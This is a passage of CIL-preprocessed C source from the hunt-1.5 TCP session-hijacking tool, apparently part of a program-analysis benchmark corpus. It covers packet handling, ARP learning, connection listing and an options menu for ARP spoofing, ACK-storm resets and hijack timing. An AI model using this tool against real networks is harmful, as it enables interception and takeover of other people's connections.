        } else {
#line 865
          pkts_dropped ++;
        }
#line 866
        goto switch_break___0;
        switch_default: /* CIL Label */ 
#line 868
        pkts_unhandled ++;
#line 869
        goto switch_break___0;
        switch_break___0: /* CIL Label */ ;
        }
      } else {
#line 872
        pkts_dropped ++;
      }
#line 873
      goto switch_break;
      case_2054: /* CIL Label */ 
#line 875
      if (p->p_raw_len < 42) {
#line 876
        pkts_dropped ++;
#line 877
        goto cont;
      }
      {
#line 879
      p->p_type = (enum PACKET_TYPE )4;
#line 880
      p->p_arph = (struct arphdr *)((char *)ethh + sizeof(struct ethhdr ));
#line 883
      process_arp(p);
#line 884
      p->p_timestamp = time((time_t *)((void *)0));
#line 885
      mac_arp_learn(p);
      }
#line 886
      goto switch_break;
      switch_default___0: /* CIL Label */ 
#line 888
      pkts_unhandled ++;
#line 889
      goto switch_break;
      switch_break: /* CIL Label */ ;
      }
    }
    cont: 
    {
#line 893
    packet_free(p);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 895
  return ((void *)0);
}
}
#line 903 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void print_tcp(struct packet *p , struct iphdr *ip , struct tcphdr *tcp ) 
{ 
  uint16_t tmp ;
  char *tmp___0 ;
  uint32_t tmp___1 ;
  unsigned int tmp___2 ;
  uint32_t tmp___3 ;
  uint16_t tmp___4 ;
  char *tmp___5 ;

  {
  {
#line 905
  tmp = ntohs(tcp->__annonCompField3.__annonCompField2.dest);
#line 905
  tmp___0 = host_lookup(ip->daddr, hl_mode);
  }
#line 905
  if (tcp->__annonCompField3.__annonCompField2.ack) {
    {
#line 905
    tmp___1 = ntohl(tcp->__annonCompField3.__annonCompField2.ack_seq);
#line 905
    tmp___2 = tmp___1;
    }
  } else {
#line 905
    tmp___2 = 0U;
  }
  {
#line 905
  tmp___3 = ntohl(tcp->__annonCompField3.__annonCompField2.seq);
#line 905
  tmp___4 = ntohs(tcp->__annonCompField3.__annonCompField2.source);
#line 905
  tmp___5 = host_lookup(ip->saddr, hl_mode);
#line 905
  fprintf((FILE */* __restrict  */)stdout, (char const   */* __restrict  */)"%s [%d] seq=(%u) ack=(%u)\t--->\t%s [%d] len=%d/%d\n",
          tmp___5, (int )tmp___4, tmp___3, tmp___2, tmp___0, (int )tmp, p->p_raw_len,
          p->p_data_len);
  }
#line 909
  return;
}
}
#line 911 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static int fill_space_to(char *b , int pos , int where ) 
{ 
  int tmp ;

  {
#line 913
  if (pos >= 0) {
#line 913
    if (pos < where) {
      {
#line 914
      tmp = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"%*s",
                    where - pos, "");
      }
#line 914
      return (tmp);
    } else {
#line 916
      return (0);
    }
  } else {
#line 916
    return (0);
  }
}
}
#line 919 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int conn_list(struct user_conn_info **ruci , char **rbuf , int with_mac , int with_seq ) 
{ 
  struct hash_iterator iter ;
  struct conn_info *ci ;
  struct user_conn_info *uci ;
  int i ;
  int count___0 ;
  char *b ;
  char *b_old ;
  char *buf ;
  void *tmp ;
  void *tmp___0 ;
  char *tmp___1 ;
  char *tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;
  char *tmp___6 ;
  char *tmp___7 ;
  int tmp___8 ;
  uint32_t tmp___9 ;
  uint32_t tmp___10 ;
  int tmp___11 ;
  int tmp___12 ;
  uint32_t tmp___13 ;
  uint32_t tmp___14 ;
  int tmp___15 ;
  int tmp___16 ;
  int tmp___17 ;
  int tmp___18 ;
  int tmp___19 ;
  int tmp___20 ;
  int tmp___21 ;
  int tmp___22 ;
  int tmp___23 ;
  int tmp___24 ;
  int tmp___25 ;
  int tmp___26 ;
  int tmp___27 ;
  void *tmp___28 ;

  {
  {
#line 927
  hash_lock(& conn_table);
#line 928
  count___0 = hash_count(& conn_table);
  }
#line 929
  if (! count___0) {
    {
#line 930
    hash_unlock(& conn_table);
    }
#line 931
    if (ruci) {
#line 932
      *ruci = (struct user_conn_info *)((void *)0);
    }
#line 933
    if (rbuf) {
#line 934
      *rbuf = (char *)((void *)0);
    }
#line 935
    return (0);
  }
#line 937
  if (rbuf) {
    {
#line 938
    tmp = malloc((size_t )(count___0 * 512));
#line 938
    buf = (char *)tmp;
    }
#line 939
    if (! buf) {
      {
#line 939
      __assert_fail("buf", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c",
                    939U, "conn_list");
      }
    }
#line 940
    b = buf;
  } else {
#line 942
    buf = (char *)((void *)0);
#line 942
    b = buf;
  }
#line 943
  if (ruci) {
    {
#line 944
    tmp___0 = malloc((unsigned long )count___0 * sizeof(struct user_conn_info ));
#line 944
    uci = (struct user_conn_info *)tmp___0;
    }
#line 945
    if (! uci) {
      {
#line 945
      __assert_fail("uci", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c",
                    945U, "conn_list");
      }
    }
  } else {
#line 947
    uci = (struct user_conn_info *)((void *)0);
  }
  {
#line 948
  i = 0;
#line 949
  hash_iter_set(& iter, & conn_table);
  }
  {
#line 950
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 950
    tmp___28 = hash_iter_get(& iter, (unsigned int *)((void *)0));
#line 950
    ci = (struct conn_info *)tmp___28;
    }
#line 950
    if (ci) {
#line 950
      if (! (i < count___0)) {
#line 950
        goto while_break;
      }
    } else {
#line 950
      goto while_break;
    }
#line 951
    if (b) {
      {
#line 952
      b_old = b;
#line 953
      tmp___1 = port_lookup(ci->src_port, hl_mode);
#line 953
      tmp___2 = host_lookup((unsigned int )ci->src_addr, hl_mode);
#line 953
      tmp___3 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"%d) %s [%s]",
                        i, tmp___2, tmp___1);
#line 953
      b += tmp___3;
#line 956
      tmp___4 = fill_space_to(b, (int )(b - b_old), 30);
#line 956
      b += tmp___4;
#line 957
      tmp___5 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)" --> ");
#line 957
      b += tmp___5;
#line 958
      tmp___6 = port_lookup(ci->dst_port, hl_mode);
#line 958
      tmp___7 = host_lookup((unsigned int )ci->dst_addr, hl_mode);
#line 958
      tmp___8 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"%s [%s]\n",
                        tmp___7, tmp___6);
#line 958
      b += tmp___8;
      }
#line 961
      if (with_seq) {
        {
#line 962
        b_old = b;
#line 963
        tmp___9 = ntohl((uint32_t )ci->src.next_d_seq);
#line 963
        tmp___10 = ntohl((uint32_t )ci->src.next_seq);
#line 963
        tmp___11 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"     seq=(%u) ack=(%u)",
                           tmp___10, tmp___9);
#line 963
        b += tmp___11;
#line 965
        tmp___12 = fill_space_to(b, (int )(b - b_old), 45);
#line 965
        b += tmp___12;
#line 966
        tmp___13 = ntohl((uint32_t )ci->dst.next_d_seq);
#line 966
        tmp___14 = ntohl((uint32_t )ci->dst.next_seq);
#line 966
        tmp___15 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)" seq=(%u) ack=(%u)\n",
                           tmp___14, tmp___13);
#line 966
        b += tmp___15;
        }
      }
#line 969
      if (with_mac) {
        {
#line 970
        b_old = b;
#line 971
        tmp___16 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"     src mac=");
#line 971
        b += tmp___16;
#line 972
        tmp___17 = sprintf_eth_mac(b, ci->src.src_mac);
#line 972
        b += tmp___17;
#line 973
        tmp___18 = fill_space_to(b, (int )(b - b_old), 45);
#line 973
        b += tmp___18;
#line 974
        tmp___19 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)" src mac=");
#line 974
        b += tmp___19;
#line 975
        tmp___20 = sprintf_eth_mac(b, ci->dst.src_mac);
#line 975
        b += tmp___20;
#line 976
        tmp___21 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"\n");
#line 976
        b += tmp___21;
#line 978
        b_old = b;
#line 979
        tmp___22 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"     dst mac=");
#line 979
        b += tmp___22;
#line 980
        tmp___23 = sprintf_eth_mac(b, ci->src.dst_mac);
#line 980
        b += tmp___23;
#line 981
        tmp___24 = fill_space_to(b, (int )(b - b_old), 45);
#line 981
        b += tmp___24;
#line 982
        tmp___25 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)" dst mac=");
#line 982
        b += tmp___25;
#line 983
        tmp___26 = sprintf_eth_mac(b, ci->dst.dst_mac);
#line 983
        b += tmp___26;
#line 984
        tmp___27 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"\n");
#line 984
        b += tmp___27;
        }
      }
    }
#line 987
    if (uci) {
#line 988
      (uci + i)->src_addr = ci->src_addr;
#line 989
      (uci + i)->dst_addr = ci->dst_addr;
#line 990
      (uci + i)->src_port = ci->src_port;
#line 991
      (uci + i)->dst_port = ci->dst_port;
    }
#line 993
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 995
  hash_iter_end(& iter);
#line 996
  hash_unlock(& conn_table);
  }
#line 998
  if (ruci) {
#line 999
    *ruci = uci;
  }
#line 1000
  if (rbuf) {
#line 1001
    *rbuf = buf;
  }
#line 1002
  return (count___0);
}
}
#line 1005 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void print_mac_table(void) 
{ 
  struct hash_iterator hi ;
  char buf[512] ;
  unsigned int key ;
  struct mac_info *mi ;
  int i ;
  char *tmp ;
  void *tmp___0 ;

  {
  {
#line 1011
  i = 0;
#line 1013
  printf((char const   */* __restrict  */)"--- mac table ---\n");
#line 1014
  hash_iter_set(& hi, & mac_table);
  }
  {
#line 1015
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 1015
    tmp___0 = hash_iter_get(& hi, & key);
#line 1015
    mi = (struct mac_info *)tmp___0;
    }
#line 1015
    if (! mi) {
#line 1015
      goto while_break;
    }
    {
#line 1016
    sprintf_eth_mac(buf, (unsigned char *)(mi->mac));
#line 1017
    tmp = host_lookup(key, hl_mode);
#line 1017
    printf((char const   */* __restrict  */)"%-24s %s\n", tmp, buf);
#line 1018
    i ++;
    }
#line 1018
    if (i % lines_o == 0) {
      {
#line 1019
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 1021
  hash_iter_end(& hi);
  }
#line 1022
  return;
}
}
#line 1024 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void print_user_conn_info(struct user_conn_info *uci , int count___0 ) 
{ 
  int i ;
  int ret ;
  char *tmp ;
  char *tmp___0 ;
  int tmp___1 ;
  char *tmp___2 ;
  char *tmp___3 ;

  {
#line 1028
  i = 0;
  {
#line 1028
  while (1) {
    while_continue: /* CIL Label */ ;
#line 1028
    if (! (i < count___0)) {
#line 1028
      goto while_break;
    }
    {
#line 1029
    tmp = port_lookup(uci->src_port, hl_mode);
#line 1029
    tmp___0 = host_lookup((unsigned int )uci->src_addr, hl_mode);
#line 1029
    ret = printf((char const   */* __restrict  */)"%d) %s [%s]", i, tmp___0, tmp);
    }
#line 1032
    if (25 - ret > 0) {
#line 1032
      tmp___1 = 20 - ret;
    } else {
#line 1032
      tmp___1 = 0;
    }
    {
#line 1032
    printf((char const   */* __restrict  */)"%*s", tmp___1, "");
#line 1033
    printf((char const   */* __restrict  */)" --> ");
#line 1034
    tmp___2 = port_lookup(uci->dst_port, hl_mode);
#line 1034
    tmp___3 = host_lookup((unsigned int )uci->dst_addr, hl_mode);
#line 1034
    printf((char const   */* __restrict  */)"%s [%s]\n", tmp___3, tmp___2);
#line 1028
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 1038
  return;
}
}
#line 15 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
int lines_o  =    1000000;
#line 17 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void list_conn_properties(void) 
{ 
  int c ;
  int mac ;
  int seq ;
  int tmp ;
  int tmp___0 ;

  {
#line 22
  if (conn_list_mac) {
#line 22
    tmp = 'y';
  } else {
#line 22
    tmp = 'n';
  }
  {
#line 22
  c = menu_choose_char((char *)"print MAC y/n", (char *)"ny", (char )tmp);
  }
  {
#line 24
  if (c == 110) {
#line 24
    goto case_110;
  }
#line 27
  if (c == 121) {
#line 27
    goto case_121;
  }
#line 30
  goto switch_default;
  case_110: /* CIL Label */ 
#line 25
  mac = 0;
#line 26
  goto switch_break;
  case_121: /* CIL Label */ 
#line 28
  mac = 1;
#line 29
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 31
  return;
  switch_break: /* CIL Label */ ;
  }
#line 33
  if (conn_list_seq) {
#line 33
    tmp___0 = 'y';
  } else {
#line 33
    tmp___0 = 'n';
  }
  {
#line 33
  c = menu_choose_char((char *)"print SEQ y/n", (char *)"ny", (char )tmp___0);
  }
  {
#line 35
  if (c == 110) {
#line 35
    goto case_110___0;
  }
#line 38
  if (c == 121) {
#line 38
    goto case_121___0;
  }
#line 41
  goto switch_default___0;
  case_110___0: /* CIL Label */ 
#line 36
  seq = 0;
#line 37
  goto switch_break___0;
  case_121___0: /* CIL Label */ 
#line 39
  seq = 1;
#line 40
  goto switch_break___0;
  switch_default___0: /* CIL Label */ 
#line 42
  return;
  switch_break___0: /* CIL Label */ ;
  }
#line 44
  conn_list_mac = mac;
#line 45
  conn_list_seq = seq;
#line 46
  return;
}
}
#line 48 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void suggest_mac_setup(void) 
{ 
  char buf[128] ;
  unsigned char buf_mac[6] ;
  int tmp ;

  {
  {
#line 53
  sprintf_eth_mac(buf, __suggest_mac);
#line 54
  tmp = menu_choose_mac((char *)"suggest MAC base", buf_mac, buf);
  }
#line 54
  if (tmp < 0) {
#line 55
    return;
  }
  {
#line 56
  memcpy((void */* __restrict  */)(__suggest_mac), (void const   */* __restrict  */)(buf_mac),
         sizeof(buf_mac));
  }
#line 57
  return;
}
}
#line 59 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void print_host_properties(void) 
{ 
  int tmp ;
  int tmp___0 ;

  {
#line 61
  if (hl_mode == 0) {
#line 61
    tmp = 'n';
  } else {
#line 61
    tmp = 'y';
  }
  {
#line 61
  tmp___0 = menu_choose_char((char *)"Resolve host names", (char *)"yn", (char )tmp);
  }
  {
#line 63
  if (tmp___0 == 121) {
#line 63
    goto case_121;
  }
#line 66
  if (tmp___0 == 110) {
#line 66
    goto case_110;
  }
#line 69
  goto switch_default;
  case_121: /* CIL Label */ 
#line 64
  hl_mode = 1;
#line 65
  goto switch_break;
  case_110: /* CIL Label */ 
#line 67
  hl_mode = 0;
#line 68
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 70
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 72
  return;
}
}
#line 74 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void mac_learn_from_ip_opt(void) 
{ 
  int tmp ;
  int tmp___0 ;

  {
#line 76
  if (mac_learn_from_ip == 0) {
#line 76
    tmp = 'n';
  } else {
#line 76
    tmp = 'y';
  }
  {
#line 76
  tmp___0 = menu_choose_char((char *)"Learn MAC from IP traffic", (char *)"yn", (char )tmp);
  }
  {
#line 78
  if (tmp___0 == 121) {
#line 78
    goto case_121;
  }
#line 81
  if (tmp___0 == 110) {
#line 81
    goto case_110;
  }
#line 84
  goto switch_default;
  case_121: /* CIL Label */ 
#line 79
  mac_learn_from_ip = 1;
#line 80
  goto switch_break;
  case_110: /* CIL Label */ 
#line 82
  mac_learn_from_ip = 0;
#line 83
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 85
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 87
  return;
}
}
#line 89 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void storm_reset_sec_setup(void) 
{ 
  int sec ;

  {
  {
#line 93
  sec = menu_choose_unr((char *)"ACK storm reset sec", 0, 10000, storm_reset_sec);
  }
#line 93
  if (sec < 0) {
#line 94
    return;
  }
#line 95
  storm_reset_sec = sec;
#line 96
  return;
}
}
#line 98 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void stormack_hijack_wait_sec_setup(void) 
{ 
  int sec ;

  {
  {
#line 102
  sec = menu_choose_unr((char *)"Sec to wait for next cmd with simple hijack", 0,
                        10000, stormack_hijack_wait_sec);
  }
#line 102
  if (sec < 0) {
#line 104
    return;
  }
#line 105
  stormack_hijack_wait_sec = sec;
#line 106
  return;
}
}
#line 108 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void arp_rr_count_setup(void) 
{ 
  int n ;

  {
  {
#line 112
  n = menu_choose_unr((char *)"Number of ARP request/reply packets hunt will send",
                      1, 32, arp_rr_count);
  }
#line 112
  if (n < 0) {
#line 113
    return;
  }
#line 114
  arp_rr_count = n;
#line 115
  return;
}
}
#line 117 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void arp_request_spoof_through_request_setup(void) 
{ 
  int tmp ;
  int tmp___0 ;

  {
#line 119
  if (arp_request_spoof_through_request) {
#line 119
    tmp = 'y';
  } else {
#line 119
    tmp = 'n';
  }
  {
#line 119
  tmp___0 = menu_choose_char((char *)"arp request spoof through request", (char *)"yn",
                             (char )tmp);
  }
  {
#line 121
  if (tmp___0 == 121) {
#line 121
    goto case_121;
  }
#line 124
  if (tmp___0 == 110) {
#line 124
    goto case_110;
  }
#line 127
  goto switch_default;
  case_121: /* CIL Label */ 
#line 122
  arp_request_spoof_through_request = 1;
#line 123
  goto switch_break;
  case_110: /* CIL Label */ 
#line 125
  arp_request_spoof_through_request = 0;
#line 126
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 128
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 130
  return;
}
}
#line 132 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void arp_spoof_switch_setup(void) 
{ 
  int tmp ;
  int tmp___0 ;

  {
#line 134
  if (arp_spoof_switch) {
#line 134
    tmp = 'y';
  } else {
#line 134
    tmp = 'n';
  }
  {
#line 134
  tmp___0 = menu_choose_char((char *)"switched environment", (char *)"yn", (char )tmp);
  }
  {
#line 136
  if (tmp___0 == 121) {
#line 136
    goto case_121;
  }
#line 139
  if (tmp___0 == 110) {
#line 139
    goto case_110;
  }
#line 142
  goto switch_default;
  case_121: /* CIL Label */ 
#line 137
  arp_spoof_switch = 1;
#line 138
  goto switch_break;
  case_110: /* CIL Label */ 
#line 140
  arp_spoof_switch = 0;
#line 141
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 143
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 145
  return;
}
}
#line 147 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void arp_spoof_with_my_mac_setup(void) 
{ 
  int tmp ;
  int tmp___0 ;

  {
#line 149
  if (arp_spoof_with_my_mac) {
#line 149
    tmp = 'y';
  } else {
#line 149
    tmp = 'n';
  }
  {
#line 149
  tmp___0 = menu_choose_char((char *)"use my mac in ARP spoofing", (char *)"yn", (char )tmp);
  }
  {
#line 151
  if (tmp___0 == 121) {
#line 151
    goto case_121;
  }
#line 154
  if (tmp___0 == 110) {
#line 154
    goto case_110;
  }
#line 157
  goto switch_default;
  case_121: /* CIL Label */ 
#line 152
  arp_spoof_with_my_mac = 1;
#line 153
  goto switch_break;
  case_110: /* CIL Label */ 
#line 155
  arp_spoof_with_my_mac = 0;
#line 156
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 158
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 160
  return;
}
}
#line 162 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void printed_lines_per_page(void) 
{ 
  int n ;

  {
#line 166
  n = lines_o;
#line 167
  if (n == 1000000) {
#line 168
    n = 0;
  }
  {
#line 169
  n = menu_choose_unr((char *)"Number of printed lines per page in listenings", 0,
                      10000, n);
  }
#line 169
  if (n < 0) {
#line 170
    return;
  }
#line 171
  if (n == 0) {
#line 172
    lines_o = 1000000;
  } else {
#line 174
    lines_o = n;
  }
#line 175
  return;
}
}
#line 178 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
int print_cntrl_chars  =    1;
#line 180 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void print_cntrl_chars_setup(void) 
{ 
  int tmp ;

  {
  {
#line 182
  tmp = menu_choose_char((char *)"print cntrl chars", (char *)"yn", (char )'y');
  }
  {
#line 183
  if (tmp == 121) {
#line 183
    goto case_121;
  }
#line 186
  if (tmp == 110) {
#line 186
    goto case_110;
  }
#line 189
  goto switch_default;
  case_121: /* CIL Label */ 
#line 184
  print_cntrl_chars = 1;
#line 185
  goto switch_break;
  case_110: /* CIL Label */ 
#line 187
  print_cntrl_chars = 0;
#line 188
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 190
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 192
  return;
}
}
#line 194 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
static void verbose_setup(void) 
{ 
  int tmp ;
  int tmp___0 ;

  {
#line 196
  if (verbose) {
#line 196
    tmp = 'y';
  } else {
#line 196
    tmp = 'n';
  }
  {
#line 196
  tmp___0 = menu_choose_char((char *)"verbose", (char *)"yn", (char )tmp);
  }
  {
#line 198
  if (tmp___0 == 121) {
#line 198
    goto case_121;
  }
#line 201
  if (tmp___0 == 110) {
#line 201
    goto case_110;
  }
#line 204
  goto switch_default;
  case_121: /* CIL Label */ 
#line 199
  verbose = 1;
#line 200
  goto switch_break;
  case_110: /* CIL Label */ 
#line 202
  verbose = 0;
#line 203
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 205
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 207
  return;
}
}
#line 209 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
void lines_o_press_key(void) 
{ 


  {
  {
#line 211
  press_key((char *)"press key");
  }
#line 212
  return;
}
}
#line 214 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/options.c"
void options_menu(void) 
{ 
  char buf_menu[2048] ;
  char buf_mac[128] ;
  char *o_keys ;
  int run_it ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;
  int tmp___6 ;
  int tmp___7 ;
  int tmp___8 ;
  int tmp___9 ;

  {
#line 218
  o_keys = (char *)"lamdcghrsqtwyepvix";
#line 221
  run_it = 1;
  {
#line 222
  while (1) {
    while_continue: /* CIL Label */ ;
#line 222
    if (! run_it) {
#line 222
      goto while_break;
    }
    {
#line 223
    sprintf_eth_mac(buf_mac, __suggest_mac);
    }
#line 224
    if (print_cntrl_chars) {
#line 224
      tmp = 'y';
    } else {
#line 224
      tmp = 'n';
    }
#line 224
    if (verbose) {
#line 224
      tmp___0 = 'y';
    } else {
#line 224
      tmp___0 = 'n';
    }
#line 224
    if (lines_o == 1000000) {
#line 224
      tmp___1 = 0;
    } else {
#line 224
      tmp___1 = lines_o;
    }
#line 224
    if (mac_learn_from_ip) {
#line 224
      tmp___2 = 'y';
    } else {
#line 224
      tmp___2 = 'n';
    }
#line 224
    if (arp_spoof_with_my_mac) {
#line 224
      tmp___3 = 'y';
    } else {
#line 224
      tmp___3 = 'n';
    }
#line 224
    if (arp_spoof_switch) {
#line 224
      tmp___4 = 'y';
    } else {
#line 224
      tmp___4 = 'n';
    }
#line 224
    if (arp_request_spoof_through_request) {
#line 224
      tmp___5 = 'y';
    } else {
#line 224
      tmp___5 = 'n';
    }
#line 224
    if (hl_mode == 0) {
#line 224
      tmp___6 = 'n';
    } else {
#line 224
      tmp___6 = 'y';
    }
#line 224
    if (conn_list_seq) {
#line 224
      tmp___7 = 'y';
    } else {
#line 224
      tmp___7 = 'n';
    }
#line 224
    if (conn_list_mac) {
#line 224
      tmp___8 = 'y';
    } else {
#line 224
      tmp___8 = 'n';
    }
    {
#line 224
    sprintf((char */* __restrict  */)(buf_menu), (char const   */* __restrict  */)"l) list add conn policy                \na/m/d) add/mod/del conn policy entry   \nc) conn list properties    mac %c, seq %c\ng) suggest mac base        %s\nh) host resolving              %c       t) arp req spoof through req   %c\nr) reset ACK storm timeout   %3ds      w) switched environment        %c\ns) simple hijack cmd timeout %3ds      y) arp spoof with my mac       %c\nq) arp req/rep packets       %3d       e) learn MAC from IP traffic   %c\np) number of lines per page  %3d       v) verbose                     %c\ni) print cntrl chars           %c\nx) return\n",
            tmp___8, tmp___7, buf_mac, tmp___6, tmp___5, storm_reset_sec, tmp___4,
            stormack_hijack_wait_sec, tmp___3, arp_rr_count, tmp___2, tmp___1, tmp___0,
            tmp);
#line 245
    tmp___9 = menu((char *)"options", buf_menu, (char *)"opt", o_keys, (char)0);
    }
    {
#line 246
    if (tmp___9 == 108) {
#line 246
      goto case_108;
    }
#line 249
    if (tmp___9 == 97) {
#line 249
      goto case_97;
    }
#line 252
    if (tmp___9 == 100) {
#line 252
      goto case_100;
    }
#line 255
    if (tmp___9 == 109) {
#line 255
      goto case_109;
    }
#line 258
    if (tmp___9 == 99) {
#line 258
      goto case_99;
    }
#line 261
    if (tmp___9 == 103) {
#line 261
      goto case_103;
    }
#line 264
    if (tmp___9 == 104) {
#line 264
      goto case_104;
    }
#line 267
    if (tmp___9 == 114) {
#line 267
      goto case_114;
    }
#line 270
    if (tmp___9 == 115) {
#line 270
      goto case_115;
    }
#line 273
    if (tmp___9 == 101) {
#line 273
      goto case_101;
    }
#line 276
    if (tmp___9 == 116) {
#line 276
      goto case_116;
    }
#line 279
    if (tmp___9 == 119) {
#line 279
      goto case_119;
    }
#line 282
    if (tmp___9 == 121) {
#line 282
      goto case_121;
    }
#line 285
    if (tmp___9 == 113) {
#line 285
      goto case_113;
    }
#line 288
    if (tmp___9 == 112) {
#line 288
      goto case_112;
    }
#line 291
    if (tmp___9 == 118) {
#line 291
      goto case_118;
    }
#line 294
    if (tmp___9 == 105) {
#line 294
      goto case_105;
    }
#line 297
    if (tmp___9 == 120) {
#line 297
      goto case_120;
    }
#line 245
    goto switch_break;
    case_108: /* CIL Label */ 
    {
#line 247
    addpolicy_list_items();
    }
#line 248
    goto switch_break;
    case_97: /* CIL Label */ 
    {
#line 250
    addpolicy_add_item();
    }
#line 251
    goto switch_break;
    case_100: /* CIL Label */ 
    {
#line 253
    addpolicy_del_item();
    }
#line 254
    goto switch_break;
    case_109: /* CIL Label */ 
    {
#line 256
    addpolicy_mod_item();
    }
#line 257
    goto switch_break;
    case_99: /* CIL Label */ 
    {
#line 259
    list_conn_properties();
    }
#line 260
    goto switch_break;
    case_103: /* CIL Label */ 
    {
#line 262
    suggest_mac_setup();
    }
#line 263
    goto switch_break;
    case_104: /* CIL Label */ 
    {
#line 265
    print_host_properties();
    }
#line 266
    goto switch_break;
    case_114: /* CIL Label */ 
    {
#line 268
    storm_reset_sec_setup();
    }
#line 269
    goto switch_break;
    case_115: /* CIL Label */ 
    {
#line 271
    stormack_hijack_wait_sec_setup();
    }
#line 272
    goto switch_break;
    case_101: /* CIL Label */ 
    {
#line 274
    mac_learn_from_ip_opt();
    }
#line 275
    goto switch_break;
    case_116: /* CIL Label */ 
    {
#line 277
    arp_request_spoof_through_request_setup();
    }
#line 278
    goto switch_break;
    case_119: /* CIL Label */ 
    {
#line 280
    arp_spoof_switch_setup();
    }
#line 281
    goto switch_break;
    case_121: /* CIL Label */ 
    {
#line 283
    arp_spoof_with_my_mac_setup();
    }
#line 284
    goto switch_break;
    case_113: /* CIL Label */ 
    {
#line 286
    arp_rr_count_setup();
    }
#line 287
    goto switch_break;
    case_112: /* CIL Label */ 
    {
#line 289
    printed_lines_per_page();
    }
#line 290
    goto switch_break;
    case_118: /* CIL Label */ 
    {
#line 292
    verbose_setup();
    }
#line 293
    goto switch_break;
    case_105: /* CIL Label */ 
    {
#line 295
    print_cntrl_chars_setup();
    }
#line 296
    goto switch_break;
    case_120: /* CIL Label */ 
#line 298
    run_it = 0;
#line 299
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 302
  return;
}
}
#line 66 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
void list_init(struct list *l , int next_offset ) ;
#line 67
void list_flush(struct list *l ) ;
#line 83
void *list_remove_func(struct list *l , int (*func)(int nr , void * , void *m ) ,
                       void *m ) ;
#line 16 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_init(struct list *l , int next_offset ) 
{ 
  void *tmp ;

  {
  {
#line 18
  tmp = (void *)0;
#line 18
  l->l_last = tmp;
#line 18
  l->l_first = tmp;
#line 19
  l->l_off = next_offset;
#line 20
  l->l_iter = (struct list_iterator *)((void *)0);
#line 21
  l->l_produce_done = 0;
#line 23
  l->l_locked = 0;
#line 24
  pthread_mutex_init(& l->l_mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 25
  pthread_cond_init((pthread_cond_t */* __restrict  */)(& l->l_notempty), (pthread_condattr_t const   */* __restrict  */)((void *)0));
#line 26
  l->l_locked_thr = (pthread_t )0;
  }
#line 28
  return;
}
}
#line 30 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static void __lock___1(struct list *l ) 
{ 
  pthread_t tmp ;

  {
#line 33
  if (! l->l_locked) {
    {
#line 34
    pthread_mutex_lock(& l->l_mutex);
    }
  } else {
    {
#line 33
    tmp = pthread_self();
    }
#line 33
    if (l->l_locked_thr != tmp) {
      {
#line 34
      pthread_mutex_lock(& l->l_mutex);
